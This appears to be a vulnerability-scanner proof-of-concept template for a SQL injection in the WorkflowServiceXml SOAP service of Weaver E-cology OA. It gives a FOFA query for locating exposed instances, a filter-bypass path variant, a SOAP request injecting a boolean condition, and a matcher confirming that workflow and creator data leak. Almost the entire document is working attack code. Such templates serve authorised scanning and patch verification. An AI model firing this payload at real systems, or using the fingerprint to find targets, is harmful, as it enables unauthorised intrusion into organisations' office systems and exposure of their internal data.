id: poc-yaml-weaver-e-cology-workflowservicexml-sqli
info:
  name: 泛微OA E-cology WorkflowServiceXml SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: e-cology
  fofa: app="泛微-OA（e-cology）"
variables:
  path: 'services/WorkflowServiceXml

    services%20/WorkflowServiceXml

    '
requests:
- method: POST
  path: /{{.path}}
  headers:
    Content-Type: text/xml
  data: '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:web="http://webservices.workflow.weaver">

    <soapenv:Header/>

    <soapenv:Body>

    <web:getHendledWorkflowRequestList>

    <web:in0>1</web:in0>

    <web:in1>1</web:in1>

    <web:in2>1</web:in2>

    <web:in3>1</web:in3>

    <web:in4>

    <web:string>1=1 AND 2=2</web:string>

    </web:in4>

    </web:getHendledWorkflowRequestList>

    </soapenv:Body>

    </soapenv:Envelope>'
  expression: status_code == 200 && contains(body,"<workflowName>") && contains(body,"<creatorName>")
    && contains(content_type,"text/xml")
transport: http
